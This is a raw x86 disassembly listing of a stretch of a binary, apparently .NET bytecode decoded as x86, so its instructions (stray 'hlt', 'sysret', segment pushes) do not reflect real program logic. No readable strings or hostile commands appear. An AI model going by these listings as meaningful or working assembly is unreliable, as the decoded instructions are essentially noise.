  4057b5:	de 0c 28             	fimuls (%eax,%ebp,1)
  4057b8:	25 00 00 0a 28       	and    $0x280a0000,%eax
  4057bd:	27                   	daa
  4057be:	00 00                	add    %al,(%eax)
  4057c0:	0a de                	or     %dh,%bl
  4057c2:	00 72 77             	add    %dh,0x77(%edx)
  4057c5:	03 00                	add    (%eax),%eax
  4057c7:	70 0a                	jo     0x4057d3
  4057c9:	2b 00                	sub    (%eax),%eax
  4057cb:	06                   	push   %es
  4057cc:	2a 00                	sub    (%eax),%al
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	01 10                	add    %edx,(%eax)
  4057d2:	00 00                	add    %al,(%eax)
  4057d4:	00 00                	add    %al,(%eax)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	2b 2b                	sub    (%ebx),%ebp
  4057da:	00 0c 29             	add    %cl,(%ecx,%ebp,1)
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	01 13                	add    %edx,(%ebx)
  4057e1:	30 02                	xor    %al,(%edx)
  4057e3:	00 10                	add    %dl,(%eax)
  4057e5:	00 00                	add    %al,(%eax)
  4057e7:	00 3d 00 00 11 28    	add    %bh,0x28110000
  4057ed:	f4                   	hlt
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	0a 02                	or     (%edx),%al
  4057f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f3:	f5                   	cmc
  4057f4:	00 00                	add    %al,(%eax)
  4057f6:	0a 0a                	or     (%edx),%cl
  4057f8:	2b 00                	sub    (%eax),%eax
  4057fa:	06                   	push   %es
  4057fb:	2a 13                	sub    (%ebx),%dl
  4057fd:	30 02                	xor    %al,(%edx)
  4057ff:	00 10                	add    %dl,(%eax)
  405801:	00 00                	add    %al,(%eax)
  405803:	00 3e                	add    %bh,(%esi)
  405805:	00 00                	add    %al,(%eax)
  405807:	11 28                	adc    %ebp,(%eax)
  405809:	f4                   	hlt
  40580a:	00 00                	add    %al,(%eax)
  40580c:	0a 02                	or     (%edx),%al
  40580e:	6f                   	outsl  %ds:(%esi),(%dx)
  40580f:	28 01                	sub    %al,(%ecx)
  405811:	00 0a                	add    %cl,(%edx)
  405813:	0a 2b                	or     (%ebx),%ch
  405815:	00 06                	add    %al,(%esi)
  405817:	2a 1b                	sub    (%ebx),%bl
  405819:	30 03                	xor    %al,(%ebx)
  40581b:	00 73 00             	add    %dh,0x0(%ebx)
  40581e:	00 00                	add    %al,(%eax)
  405820:	3f                   	aas
  405821:	00 00                	add    %al,(%eax)
  405823:	11 1b                	adc    %ebx,(%ebx)
  405825:	8d 03                	lea    (%ebx),%eax
  405827:	00 00                	add    %al,(%eax)
  405829:	01 0b                	add    %ecx,(%ebx)
  40582b:	07                   	pop    %es
  40582c:	16                   	push   %ss
  40582d:	28 29                	sub    %ch,(%ecx)
  40582f:	01 00                	add    %eax,(%eax)
  405831:	0a 8c 7d 00 00 01 a2 	or     -0x5dff0000(%ebp,%edi,2),%cl
  405838:	07                   	pop    %es
  405839:	17                   	pop    %ss
  40583a:	28 75 00             	sub    %dh,0x0(%ebp)
  40583d:	00 0a                	add    %cl,(%edx)
  40583f:	a2 07 18 28 81       	mov    %al,0x81281807
  405844:	00 00                	add    %al,(%eax)
  405846:	0a a2 07 19 28 77    	or     0x77281907(%edx),%ah
  40584c:	00 00                	add    %al,(%eax)
  40584e:	0a a2 07 1a 28 2a    	or     0x2a281a07(%edx),%ah
  405854:	01 00                	add    %eax,(%eax)
  405856:	0a 28                	or     (%eax),%ch
  405858:	2b 01                	sub    (%ecx),%eax
  40585a:	00 0a                	add    %cl,(%edx)
  40585c:	73 2c                	jae    0x40588a
  40585e:	01 00                	add    %eax,(%eax)
  405860:	0a 6f 2d             	or     0x2d(%edi),%ch
  405863:	01 00                	add    %eax,(%eax)
  405865:	0a 8c 9f 00 00 01 a2 	or     -0x5dff0000(%edi,%ebx,4),%cl
  40586c:	07                   	pop    %es
  40586d:	28 7b 00             	sub    %bh,0x0(%ebx)
  405870:	00 0a                	add    %cl,(%edx)
  405872:	28 6f 00             	sub    %ch,0x0(%edi)
  405875:	00 06                	add    %al,(%esi)
  405877:	0a de                	or     %dh,%bl
  405879:	1b de                	sbb    %esi,%ebx
  40587b:	19 28                	sbb    %ebp,(%eax)
  40587d:	25 00 00 0a 72       	and    $0x720a0000,%eax
  405882:	9b                   	fwait
  405883:	12 00                	adc    (%eax),%al
  405885:	70 0a                	jo     0x405891
  405887:	28 27                	sub    %ah,(%edi)
  405889:	00 00                	add    %al,(%eax)
  40588b:	0a de                	or     %dh,%bl
  40588d:	07                   	pop    %es
  40588e:	28 27                	sub    %ah,(%edi)
  405890:	00 00                	add    %al,(%eax)
  405892:	0a de                	or     %dh,%bl
  405894:	00 06                	add    %al,(%esi)
  405896:	2a 00                	sub    (%eax),%al
  405898:	01 10                	add    %edx,(%eax)
  40589a:	00 00                	add    %al,(%eax)
  40589c:	00 00                	add    %al,(%eax)
  40589e:	00 00                	add    %al,(%eax)
  4058a0:	58                   	pop    %eax
  4058a1:	58                   	pop    %eax
  4058a2:	00 19                	add    %bl,(%ecx)
  4058a4:	29 00                	sub    %eax,(%eax)
  4058a6:	00 01                	add    %al,(%ecx)
  4058a8:	13 30                	adc    (%eax),%esi
  4058aa:	03 00                	add    (%eax),%eax
  4058ac:	68 00 00 00 40       	push   $0x40000000
  4058b1:	00 00                	add    %al,(%eax)
  4058b3:	11 73 18             	adc    %esi,0x18(%ebx)
  4058b6:	01 00                	add    %eax,(%eax)
  4058b8:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4058bb:	2e 01 00             	add    %eax,%cs:(%eax)
  4058be:	0a 02                	or     (%edx),%al
  4058c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c1:	f5                   	cmc
  4058c2:	00 00                	add    %al,(%eax)
  4058c4:	0a 0a                	or     (%edx),%cl
  4058c6:	08 06                	or     %al,(%esi)
  4058c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c9:	19 01                	sbb    %eax,(%ecx)
  4058cb:	00 0a                	add    %cl,(%edx)
  4058cd:	0a 73 83             	or     -0x7d(%ebx),%dh
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	0a 0d 06 13 06 16    	or     0x16061306,%cl
  4058d8:	13 05 2b 20 11 06    	adc    0x611202b,%eax
  4058de:	11 05 91 13 04 09    	adc    %eax,0x9041391
  4058e4:	12 04 72             	adc    (%edx,%esi,2),%al
  4058e7:	ad                   	lods   %ds:(%esi),%eax
  4058e8:	12 00                	adc    (%eax),%al
  4058ea:	70 28                	jo     0x405914
  4058ec:	2f                   	das
  4058ed:	01 00                	add    %eax,(%eax)
  4058ef:	0a 6f 88             	or     -0x78(%edi),%ch
  4058f2:	00 00                	add    %al,(%eax)
  4058f4:	0a 26                	or     (%esi),%ah
  4058f6:	11 05 17 d6 13 05    	adc    %eax,0x513d617
  4058fc:	11 05 11 06 8e b7    	adc    %eax,0xb78e0611
  405902:	32 d8                	xor    %al,%bl
  405904:	09 6f 8a             	or     %ebp,-0x76(%edi)
  405907:	00 00                	add    %al,(%eax)
  405909:	0a 16                	or     (%esi),%dl
  40590b:	1f                   	pop    %ds
  40590c:	14 6f                	adc    $0x6f,%al
  40590e:	8d 00                	lea    (%eax),%eax
  405910:	00 0a                	add    %cl,(%edx)
  405912:	6f                   	outsl  %ds:(%esi),(%dx)
  405913:	30 01                	xor    %al,(%ecx)
  405915:	00 0a                	add    %cl,(%edx)
  405917:	0b 2b                	or     (%ebx),%ebp
  405919:	00 07                	add    %al,(%edi)
  40591b:	2a 1b                	sub    (%ebx),%bl
  40591d:	30 04 00             	xor    %al,(%eax,%eax,1)
  405920:	40                   	inc    %eax
  405921:	00 00                	add    %al,(%eax)
  405923:	00 41 00             	add    %al,0x0(%ecx)
  405926:	00 11                	add    %dl,(%ecx)
  405928:	7e f9                	jle    0x405923
  40592a:	00 00                	add    %al,(%eax)
  40592c:	0a 7e 2b             	or     0x2b(%esi),%bh
  40592f:	00 00                	add    %al,(%eax)
  405931:	04 18                	add    $0x18,%al
  405933:	6f                   	outsl  %ds:(%esi),(%dx)
  405934:	31 01                	xor    %eax,(%ecx)
  405936:	00 0a                	add    %cl,(%edx)
  405938:	0b 07                	or     (%edi),%eax
  40593a:	02 03                	add    (%ebx),%al
  40593c:	19 6f 32             	sbb    %ebp,0x32(%edi)
  40593f:	01 00                	add    %eax,(%eax)
  405941:	0a 17                	or     (%edi),%dl
  405943:	0a de                	or     %dh,%bl
  405945:	20 de                	and    %bl,%dh
  405947:	0a 07                	or     (%edi),%al
  405949:	2c 06                	sub    $0x6,%al
  40594b:	07                   	pop    %es
  40594c:	6f                   	outsl  %ds:(%esi),(%dx)
  40594d:	5e                   	pop    %esi
  40594e:	00 00                	add    %al,(%eax)
  405950:	0a dc                	or     %ah,%bl
  405952:	de 0e                	fimuls (%esi)
  405954:	25 28 25 00 00       	and    $0x2528,%eax
  405959:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  40595c:	27                   	daa
  40595d:	00 00                	add    %al,(%eax)
  40595f:	0a de                	or     %dh,%bl
  405961:	00 16                	add    %dl,(%esi)
  405963:	0a 2b                	or     (%ebx),%ch
  405965:	00 06                	add    %al,(%esi)
  405967:	2a 01                	sub    (%ecx),%al
  405969:	1c 00                	sbb    $0x0,%al
  40596b:	00 02                	add    %al,(%edx)
  40596d:	00 11                	add    %dl,(%ecx)
  40596f:	00 0f                	add    %cl,(%edi)
  405971:	20 00                	and    %al,(%eax)
  405973:	0a 00                	or     (%eax),%al
  405975:	00 00                	add    %al,(%eax)
  405977:	00 00                	add    %al,(%eax)
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 2c 2c             	add    %ch,(%esp,%ebp,1)
  40597e:	00 0e                	add    %cl,(%esi)
  405980:	29 00                	sub    %eax,(%eax)
  405982:	00 01                	add    %al,(%ecx)
  405984:	1b 30                	sbb    (%eax),%esi
  405986:	02 00                	add    (%eax),%al
  405988:	48                   	dec    %eax
  405989:	00 00                	add    %al,(%eax)
  40598b:	00 42 00             	add    %al,0x0(%edx)
  40598e:	00 11                	add    %dl,(%ecx)
  405990:	7e f9                	jle    0x40598b
  405992:	00 00                	add    %al,(%eax)
  405994:	0a 7e 2b             	or     0x2b(%esi),%bh
  405997:	00 00                	add    %al,(%eax)
  405999:	04 6f                	add    $0x6f,%al
  40599b:	33 01                	xor    (%ecx),%eax
  40599d:	00 0a                	add    %cl,(%edx)
  40599f:	0b 07                	or     (%edi),%eax
  4059a1:	02 6f 34             	add    0x34(%edi),%ch
  4059a4:	01 00                	add    %eax,(%eax)
  4059a6:	0a 28                	or     (%eax),%ch
  4059a8:	11 00                	adc    %eax,(%eax)
  4059aa:	00 0a                	add    %cl,(%edx)
  4059ac:	0c 08                	or     $0x8,%al
  4059ae:	74 09                	je     0x4059b9
  4059b0:	00 00                	add    %al,(%eax)
  4059b2:	1b 0a                	sbb    (%edx),%ecx
  4059b4:	de 20                	fisubs (%eax)
  4059b6:	de 0a                	fimuls (%edx)
  4059b8:	07                   	pop    %es
  4059b9:	2c 06                	sub    $0x6,%al
  4059bb:	07                   	pop    %es
  4059bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4059bd:	5e                   	pop    %esi
  4059be:	00 00                	add    %al,(%eax)
  4059c0:	0a dc                	or     %ah,%bl
  4059c2:	de 0e                	fimuls (%esi)
  4059c4:	25 28 25 00 00       	and    $0x2528,%eax
  4059c9:	0a 0d 28 27 00 00    	or     0x2728,%cl
  4059cf:	0a de                	or     %dh,%bl
  4059d1:	00 14 0a             	add    %dl,(%edx,%ecx,1)
  4059d4:	2b 00                	sub    (%eax),%eax
  4059d6:	06                   	push   %es
  4059d7:	2a 01                	sub    (%ecx),%al
  4059d9:	1c 00                	sbb    $0x0,%al
  4059db:	00 02                	add    %al,(%edx)
  4059dd:	00 10                	add    %dl,(%eax)
  4059df:	00 18                	add    %bl,(%eax)
  4059e1:	28 00                	sub    %al,(%eax)
  4059e3:	0a 00                	or     (%eax),%al
  4059e5:	00 00                	add    %al,(%eax)
  4059e7:	00 00                	add    %al,(%eax)
  4059e9:	00 00                	add    %al,(%eax)
  4059eb:	00 34 34             	add    %dh,(%esp,%esi,1)
  4059ee:	00 0e                	add    %cl,(%esi)
  4059f0:	29 00                	sub    %eax,(%eax)
  4059f2:	00 01                	add    %al,(%ecx)
  4059f4:	1b 30                	sbb    (%eax),%esi
  4059f6:	09 00                	or     %eax,(%eax)
  4059f8:	5f                   	pop    %edi
  4059f9:	01 00                	add    %eax,(%eax)
  4059fb:	00 43 00             	add    %al,0x0(%ebx)
  4059fe:	00 11                	add    %dl,(%ecx)
  405a00:	02 73 35             	add    0x35(%ebx),%dh
  405a03:	01 00                	add    %eax,(%eax)
  405a05:	0a 0b                	or     (%ebx),%cl
  405a07:	1a 8d 4f 00 00 01    	sbb    0x100004f(%ebp),%cl
  405a0d:	0d 07 14 72 b3       	or     $0xb3721407,%eax
  405a12:	12 00                	adc    (%eax),%al
  405a14:	70 19                	jo     0x405a2f
  405a16:	8d 03                	lea    (%ebx),%eax
  405a18:	00 00                	add    %al,(%eax)
  405a1a:	01 13                	add    %edx,(%ebx)
  405a1c:	06                   	push   %es
  405a1d:	11 06                	adc    %eax,(%esi)
  405a1f:	16                   	push   %ss
  405a20:	09 a2 11 06 17 16    	or     %esp,0x16170611(%edx)
  405a26:	8c 7d 00             	mov    %?,0x0(%ebp)
  405a29:	00 01                	add    %al,(%ecx)
  405a2b:	a2 11 06 18 1a       	mov    %al,0x1a180611
  405a30:	8c 7d 00             	mov    %?,0x0(%ebp)
  405a33:	00 01                	add    %al,(%ecx)
  405a35:	a2 11 06 13 07       	mov    %al,0x7130611
  405a3a:	11 07                	adc    %eax,(%edi)
  405a3c:	14 14                	adc    $0x14,%al
  405a3e:	19 8d 38 00 00 01    	sbb    %ecx,0x1000038(%ebp)
  405a44:	13 08                	adc    (%eax),%ecx
  405a46:	11 08                	adc    %ecx,(%eax)
  405a48:	16                   	push   %ss
  405a49:	17                   	pop    %ss
  405a4a:	9c                   	pushf
  405a4b:	11 08                	adc    %ecx,(%eax)
  405a4d:	17                   	pop    %ss
  405a4e:	16                   	push   %ss
  405a4f:	9c                   	pushf
  405a50:	11 08                	adc    %ecx,(%eax)
  405a52:	18 16                	sbb    %dl,(%esi)
  405a54:	9c                   	pushf
  405a55:	11 08                	adc    %ecx,(%eax)
  405a57:	17                   	pop    %ss
  405a58:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405a5c:	0a 26                	or     (%esi),%ah
  405a5e:	11 08                	adc    %ecx,(%eax)
  405a60:	16                   	push   %ss
  405a61:	90                   	nop
  405a62:	2c 1e                	sub    $0x1e,%al
  405a64:	11 07                	adc    %eax,(%edi)
  405a66:	16                   	push   %ss
  405a67:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405a6e:	09 00                	or     %eax,(%eax)
  405a70:	00 1b                	add    %bl,(%ebx)
  405a72:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405a75:	00 0a                	add    %cl,(%edx)
  405a77:	28 42 00             	sub    %al,0x0(%edx)
  405a7a:	00 0a                	add    %cl,(%edx)
  405a7c:	74 09                	je     0x405a87
  405a7e:	00 00                	add    %al,(%eax)
  405a80:	1b 0d 09 16 28 36    	sbb    0x36281609,%ecx
  405a86:	01 00                	add    %eax,(%eax)
  405a88:	0a 8c 7d 00 00 01 0c 	or     0xc010000(%ebp,%edi,2),%cl
  405a8f:	07                   	pop    %es
  405a90:	74 61                	je     0x405af3
  405a92:	00 00                	add    %al,(%eax)
  405a94:	01 16                	add    %edx,(%esi)
  405a96:	73 37                	jae    0x405acf
  405a98:	01 00                	add    %eax,(%eax)
  405a9a:	0a 13                	or     (%ebx),%dl
  405a9c:	04 08                	add    $0x8,%al
  405a9e:	17                   	pop    %ss
  405a9f:	8c 7d 00             	mov    %?,0x0(%ebp)
  405aa2:	00 01                	add    %al,(%ecx)
  405aa4:	28 38                	sub    %bh,(%eax)
  405aa6:	01 00                	add    %eax,(%eax)
  405aa8:	0a 28                	or     (%eax),%ch
  405aaa:	0b 01                	or     (%ecx),%eax
  405aac:	00 0a                	add    %cl,(%edx)
  405aae:	17                   	pop    %ss
  405aaf:	d6                   	salc
  405ab0:	8d 4f 00             	lea    0x0(%edi),%ecx
  405ab3:	00 01                	add    %al,(%ecx)
  405ab5:	13 05 11 04 14 72    	adc    0x72140411,%eax
  405abb:	b3 12                	mov    $0x12,%bl
  405abd:	00 70 19             	add    %dh,0x19(%eax)
  405ac0:	8d 03                	lea    (%ebx),%eax
  405ac2:	00 00                	add    %al,(%eax)
  405ac4:	01 13                	add    %edx,(%ebx)
  405ac6:	07                   	pop    %es
  405ac7:	11 07                	adc    %eax,(%edi)
  405ac9:	16                   	push   %ss
  405aca:	11 05 28 11 00 00    	adc    %eax,0x1128
  405ad0:	0a a2 11 07 17 16    	or     0x16170711(%edx),%ah
  405ad6:	8c 7d 00             	mov    %?,0x0(%ebp)
  405ad9:	00 01                	add    %al,(%ecx)
  405adb:	a2 11 07 18 08       	mov    %al,0x8180711
  405ae0:	28 11                	sub    %dl,(%ecx)
  405ae2:	00 00                	add    %al,(%eax)
  405ae4:	0a a2 11 07 13 06    	or     0x6130711(%edx),%ah
  405aea:	11 06                	adc    %eax,(%esi)
  405aec:	14 14                	adc    $0x14,%al
  405aee:	19 8d 38 00 00 01    	sbb    %ecx,0x1000038(%ebp)
  405af4:	13 08                	adc    (%eax),%ecx
  405af6:	11 08                	adc    %ecx,(%eax)
  405af8:	16                   	push   %ss
  405af9:	17                   	pop    %ss
  405afa:	9c                   	pushf
  405afb:	11 08                	adc    %ecx,(%eax)
  405afd:	17                   	pop    %ss
  405afe:	16                   	push   %ss
  405aff:	9c                   	pushf
  405b00:	11 08                	adc    %ecx,(%eax)
  405b02:	18 17                	sbb    %dl,(%edi)
  405b04:	9c                   	pushf
  405b05:	11 08                	adc    %ecx,(%eax)
  405b07:	17                   	pop    %ss
  405b08:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405b0c:	0a 26                	or     (%esi),%ah
  405b0e:	11 08                	adc    %ecx,(%eax)
  405b10:	16                   	push   %ss
  405b11:	90                   	nop
  405b12:	2c 0b                	sub    $0xb,%al
  405b14:	11 06                	adc    %eax,(%esi)
  405b16:	16                   	push   %ss
  405b17:	9a 28 11 00 00 0a 13 	lcall  $0x130a,$0x1128
  405b1e:	05 11 08 18 90       	add    $0x90180811,%eax
  405b23:	2c 0a                	sub    $0xa,%al
  405b25:	11 06                	adc    %eax,(%esi)
  405b27:	18 9a 28 11 00 00    	sbb    %bl,0x1128(%edx)
  405b2d:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  405b30:	05 74 09 00 00       	add    $0x974,%eax
  405b35:	1b 0a                	sbb    (%edx),%ecx
  405b37:	de 24 de             	fisubs (%esi,%ebx,8)
  405b3a:	11 11                	adc    %edx,(%ecx)
  405b3c:	04 2c                	add    $0x2c,%al
  405b3e:	0c 11                	or     $0x11,%al
  405b40:	04 74                	add    $0x74,%al
  405b42:	43                   	inc    %ebx
  405b43:	00 00                	add    %al,(%eax)
  405b45:	01 6f 5e             	add    %ebp,0x5e(%edi)
  405b48:	00 00                	add    %al,(%eax)
  405b4a:	0a dc                	or     %ah,%bl
  405b4c:	de 0f                	fimuls (%edi)
  405b4e:	07                   	pop    %es
  405b4f:	2c 0b                	sub    $0xb,%al
  405b51:	07                   	pop    %es
  405b52:	74 43                	je     0x405b97
  405b54:	00 00                	add    %al,(%eax)
  405b56:	01 6f 5e             	add    %ebp,0x5e(%edi)
  405b59:	00 00                	add    %al,(%eax)
  405b5b:	0a dc                	or     %ah,%bl
  405b5d:	06                   	push   %es
  405b5e:	2a 00                	sub    (%eax),%al
  405b60:	41                   	inc    %ecx
  405b61:	34 00                	xor    $0x0,%al
  405b63:	00 02                	add    %al,(%edx)
  405b65:	00 00                	add    %al,(%eax)
  405b67:	00 9d 00 00 00 9e    	add    %bl,-0x62000000(%ebp)
  405b6d:	00 00                	add    %al,(%eax)
  405b6f:	00 3b                	add    %bh,(%ebx)
  405b71:	01 00                	add    %eax,(%eax)
  405b73:	00 11                	add    %dl,(%ecx)
  405b75:	00 00                	add    %al,(%eax)
  405b77:	00 00                	add    %al,(%eax)
  405b79:	00 00                	add    %al,(%eax)
  405b7b:	00 02                	add    %al,(%edx)
  405b7d:	00 00                	add    %al,(%eax)
  405b7f:	00 07                	add    %al,(%edi)
  405b81:	00 00                	add    %al,(%eax)
  405b83:	00 47 01             	add    %al,0x1(%edi)
  405b86:	00 00                	add    %al,(%eax)
  405b88:	4e                   	dec    %esi
  405b89:	01 00                	add    %eax,(%eax)
  405b8b:	00 0f                	add    %cl,(%edi)
  405b8d:	00 00                	add    %al,(%eax)
  405b8f:	00 00                	add    %al,(%eax)
  405b91:	00 00                	add    %al,(%eax)
  405b93:	00 1b                	add    %bl,(%ebx)
  405b95:	30 09                	xor    %cl,(%ecx)
  405b97:	00 50 01             	add    %dl,0x1(%eax)
  405b9a:	00 00                	add    %al,(%eax)
  405b9c:	44                   	inc    %esp
  405b9d:	00 00                	add    %al,(%eax)
  405b9f:	11 73 6c             	adc    %esi,0x6c(%ebx)
  405ba2:	00 00                	add    %al,(%eax)
  405ba4:	0a 0b                	or     (%ebx),%cl
  405ba6:	02 8e b7 28 39 01    	add    0x13928b7(%esi),%cl
  405bac:	00 0a                	add    %cl,(%edx)
  405bae:	0c 07                	or     $0x7,%al
  405bb0:	14 72                	adc    $0x72,%al
  405bb2:	bd 12 00 70 19       	mov    $0x19700012,%ebp
  405bb7:	8d 03                	lea    (%ebx),%eax
  405bb9:	00 00                	add    %al,(%eax)
  405bbb:	01 13                	add    %edx,(%ebx)
  405bbd:	04 11                	add    $0x11,%al
  405bbf:	04 16                	add    $0x16,%al
  405bc1:	08 28                	or     %ch,(%eax)
  405bc3:	11 00                	adc    %eax,(%eax)
  405bc5:	00 0a                	add    %cl,(%edx)
  405bc7:	a2 11 04 17 16       	mov    %al,0x16170411
  405bcc:	8c 7d 00             	mov    %?,0x0(%ebp)
  405bcf:	00 01                	add    %al,(%ecx)
  405bd1:	a2 11 04 18 1a       	mov    %al,0x1a180411
  405bd6:	8c 7d 00             	mov    %?,0x0(%ebp)
  405bd9:	00 01                	add    %al,(%ecx)
  405bdb:	a2 11 04 13 05       	mov    %al,0x5130411
  405be0:	11 05 14 14 19 8d    	adc    %eax,0x8d191414
  405be6:	38 00                	cmp    %al,(%eax)
  405be8:	00 01                	add    %al,(%ecx)
  405bea:	13 06                	adc    (%esi),%eax
  405bec:	11 06                	adc    %eax,(%esi)
  405bee:	16                   	push   %ss
  405bef:	17                   	pop    %ss
  405bf0:	9c                   	pushf
  405bf1:	11 06                	adc    %eax,(%esi)
  405bf3:	17                   	pop    %ss
  405bf4:	16                   	push   %ss
  405bf5:	9c                   	pushf
  405bf6:	11 06                	adc    %eax,(%esi)
  405bf8:	18 16                	sbb    %dl,(%esi)
  405bfa:	9c                   	pushf
  405bfb:	11 06                	adc    %eax,(%esi)
  405bfd:	17                   	pop    %ss
  405bfe:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405c02:	0a 26                	or     (%esi),%ah
  405c04:	11 06                	adc    %eax,(%esi)
  405c06:	16                   	push   %ss
  405c07:	90                   	nop
  405c08:	2c 0a                	sub    $0xa,%al
  405c0a:	11 05 16 9a 28 11    	adc    %eax,0x11289a16
  405c10:	00 00                	add    %al,(%eax)
  405c12:	0a 0c 07             	or     (%edi,%eax,1),%cl
  405c15:	74 61                	je     0x405c78
  405c17:	00 00                	add    %al,(%eax)
  405c19:	01 17                	add    %edx,(%edi)
  405c1b:	73 37                	jae    0x405c54
  405c1d:	01 00                	add    %eax,(%eax)
  405c1f:	0a 0d 09 14 72 bd    	or     0xbd721409,%cl
  405c25:	12 00                	adc    (%eax),%al
  405c27:	70 19                	jo     0x405c42
  405c29:	8d 03                	lea    (%ebx),%eax
  405c2b:	00 00                	add    %al,(%eax)
  405c2d:	01 13                	add    %edx,(%ebx)
  405c2f:	05 11 05 16 02       	add    $0x2160511,%eax
  405c34:	a2 11 05 17 16       	mov    %al,0x16170511
  405c39:	8c 7d 00             	mov    %?,0x0(%ebp)
  405c3c:	00 01                	add    %al,(%ecx)
  405c3e:	a2 11 05 18 02       	mov    %al,0x2180511
  405c43:	8e b7 8c 7d 00 00    	mov    0x7d8c(%edi),%?
  405c49:	01 a2 11 05 13 04    	add    %esp,0x4130511(%edx)
  405c4f:	11 04 14             	adc    %eax,(%esp,%edx,1)
  405c52:	14 19                	adc    $0x19,%al
  405c54:	8d 38                	lea    (%eax),%edi
  405c56:	00 00                	add    %al,(%eax)
  405c58:	01 13                	add    %edx,(%ebx)
  405c5a:	06                   	push   %es
  405c5b:	11 06                	adc    %eax,(%esi)
  405c5d:	16                   	push   %ss
  405c5e:	17                   	pop    %ss
  405c5f:	9c                   	pushf
  405c60:	11 06                	adc    %eax,(%esi)
  405c62:	17                   	pop    %ss
  405c63:	16                   	push   %ss
  405c64:	9c                   	pushf
  405c65:	11 06                	adc    %eax,(%esi)
  405c67:	18 16                	sbb    %dl,(%esi)
  405c69:	9c                   	pushf
  405c6a:	11 06                	adc    %eax,(%esi)
  405c6c:	17                   	pop    %ss
  405c6d:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405c71:	0a 26                	or     (%esi),%ah
  405c73:	11 06                	adc    %eax,(%esi)
  405c75:	16                   	push   %ss
  405c76:	90                   	nop
  405c77:	2c 1f                	sub    $0x1f,%al
  405c79:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405c7c:	9a 28 11 00 00 0a d0 	lcall  $0xd00a,$0x1128
  405c83:	09 00                	or     %eax,(%eax)
  405c85:	00 1b                	add    %bl,(%ebx)
  405c87:	28 14 00             	sub    %dl,(%eax,%eax,1)
  405c8a:	00 0a                	add    %cl,(%edx)
  405c8c:	28 42 00             	sub    %al,0x0(%edx)
  405c8f:	00 0a                	add    %cl,(%edx)
  405c91:	74 09                	je     0x405c9c
  405c93:	00 00                	add    %al,(%eax)
  405c95:	1b 10                	sbb    (%eax),%edx
  405c97:	00 09                	add    %cl,(%ecx)
  405c99:	14 72                	adc    $0x72,%al
  405c9b:	c9                   	leave
  405c9c:	12 00                	adc    (%eax),%al
  405c9e:	70 16                	jo     0x405cb6
  405ca0:	8d 03                	lea    (%ebx),%eax
  405ca2:	00 00                	add    %al,(%eax)
  405ca4:	01 14 14             	add    %edx,(%esp,%edx,1)
  405ca7:	14 17                	adc    $0x17,%al
  405ca9:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405cad:	0a 26                	or     (%esi),%ah
  405caf:	de 0f                	fimuls (%edi)
  405cb1:	09 2c 0b             	or     %ebp,(%ebx,%ecx,1)
  405cb4:	09 74 43 00          	or     %esi,0x0(%ebx,%eax,2)
  405cb8:	00 01                	add    %al,(%ecx)
  405cba:	6f                   	outsl  %ds:(%esi),(%dx)
  405cbb:	5e                   	pop    %esi
  405cbc:	00 00                	add    %al,(%eax)
  405cbe:	0a dc                	or     %ah,%bl
  405cc0:	07                   	pop    %es
  405cc1:	14 72                	adc    $0x72,%al
  405cc3:	d5 12                	aad    $0x12
  405cc5:	00 70 16             	add    %dh,0x16(%eax)
  405cc8:	8d 03                	lea    (%ebx),%eax
  405cca:	00 00                	add    %al,(%eax)
  405ccc:	01 14 14             	add    %edx,(%esp,%edx,1)
  405ccf:	14 28                	adc    $0x28,%al
  405cd1:	41                   	inc    %ecx
  405cd2:	00 00                	add    %al,(%eax)
  405cd4:	0a 74 09 00          	or     0x0(%ecx,%ecx,1),%dh
  405cd8:	00 1b                	add    %bl,(%ebx)
  405cda:	0a de                	or     %dh,%bl
  405cdc:	11 de                	adc    %ebx,%esi
  405cde:	0f 07                	sysret
  405ce0:	2c 0b                	sub    $0xb,%al
  405ce2:	07                   	pop    %es
  405ce3:	74 43                	je     0x405d28
  405ce5:	00 00                	add    %al,(%eax)
  405ce7:	01 6f 5e             	add    %ebp,0x5e(%edi)
  405cea:	00 00                	add    %al,(%eax)
  405cec:	0a dc                	or     %ah,%bl
  405cee:	06                   	push   %es
  405cef:	2a 41 34             	sub    0x34(%ecx),%al
  405cf2:	00 00                	add    %al,(%eax)
  405cf4:	02 00                	add    (%eax),%al
  405cf6:	00 00                	add    %al,(%eax)
  405cf8:	81 00 00 00 90 00    	addl   $0x900000,(%eax)
  405cfe:	00 00                	add    %al,(%eax)
  405d00:	11 01                	adc    %eax,(%ecx)
  405d02:	00 00                	add    %al,(%eax)
  405d04:	0f 00 00             	sldt   (%eax)
  405d07:	00 00                	add    %al,(%eax)
  405d09:	00 00                	add    %al,(%eax)
  405d0b:	00 02                	add    %al,(%edx)
  405d0d:	00 00                	add    %al,(%eax)
  405d0f:	00 06                	add    %al,(%esi)
  405d11:	00 00                	add    %al,(%eax)
  405d13:	00 39                	add    %bh,(%ecx)
  405d15:	01 00                	add    %eax,(%eax)
  405d17:	00 3f                	add    %bh,(%edi)
  405d19:	01 00                	add    %eax,(%eax)
  405d1b:	00 0f                	add    %cl,(%edi)
  405d1d:	00 00                	add    %al,(%eax)
  405d1f:	00 00                	add    %al,(%eax)
  405d21:	00 00                	add    %al,(%eax)
  405d23:	00 1b                	add    %bl,(%ebx)
  405d25:	30 04 00             	xor    %al,(%eax,%eax,1)
  405d28:	55                   	push   %ebp
  405d29:	00 00                	add    %al,(%eax)
  405d2b:	00 45 00             	add    %al,0x0(%ebp)
  405d2e:	00 11                	add    %dl,(%ecx)
  405d30:	73 17                	jae    0x405d49
  405d32:	01 00                	add    %eax,(%eax)
